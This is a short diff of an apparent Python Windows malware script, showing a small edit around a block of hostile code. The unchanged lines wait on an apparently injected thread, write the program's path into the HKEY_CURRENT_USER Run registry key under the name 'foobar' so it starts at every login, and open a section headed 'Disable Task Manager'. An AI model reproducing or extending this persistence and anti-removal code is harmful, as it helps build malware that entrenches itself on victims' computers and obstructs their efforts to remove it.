@@ -61,11 +61,9 @@ else:
 	ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 	
 	# Registry key
-	PATH_TO_YOUR_EXECUTABLE = PATH
-	
 	aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
 	aKey = OpenKey(aReg, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE)
-	SetValueEx(aKey,"foobar",1, REG_SZ, PATH_TO_YOUR_EXECUTABLE)
+	SetValueEx(aKey,"foobar",1, REG_SZ, PATH)
 	CloseKey(aKey)
 	
 	# Disable Task Manager
